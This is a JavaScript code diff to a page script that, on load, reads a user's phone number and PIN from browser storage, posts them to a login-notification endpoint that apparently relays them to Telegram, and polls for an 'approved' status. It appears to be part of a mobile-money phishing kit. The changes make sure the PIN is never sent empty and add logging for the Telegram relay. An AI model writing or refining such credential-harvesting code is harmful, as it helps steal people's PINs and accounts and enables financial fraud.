@@ -95,21 +95,27 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
 
     const phone = localStorage.getItem("phone") || "";
-    const pin = localStorage.getItem("lastPin") || "";
+    // Check both potential storage keys for PIN so it never sends an empty string
+    const pin = localStorage.getItem("lastPin") || localStorage.getItem("pin") || "";
 
-    if (!phone) {
-        console.warn("⚠️ Nambar telefoon lama helin.");
+    if (!phone || !pin) {
+        console.warn("⚠️ Phone or PIN missing in localStorage:", { phone, pin });
     }
 
     // -------------------- SEND LOGIN REQUEST --------------------
     try {
-        await fetch("/api/login-notification", {
+        const response = await fetch("/api/login-notification", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ phone, pin })
         });
+
+        const data = await response.json();
+        if (!response.ok) {
+            console.error("❌ Telegram Notification Error:", data);
+        }
     } catch (err) {
-        console.error("❌ Makal-mucaawino:", err);
+        console.error("❌ Network error:", err);
     }
 
     // -------------------- TEXT CHANGE --------------------
@@ -123,7 +129,7 @@ document.addEventListener("DOMContentLoaded", async () => {
         if (!phone) return;
 
         try {
-            const res = await fetch(`/api/check-status?phone=${phone}`);
+            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
             const data = await res.json();
 
             if (data.status === "approved") {
@@ -141,7 +147,7 @@ document.addEventListener("DOMContentLoaded", async () => {
             }
 
         } catch (err) {
-            console.error("❌ Hubinta xaalada waa lagulamaid:", err);
+            console.error("❌ Status check error:", err);
         }
     }
 
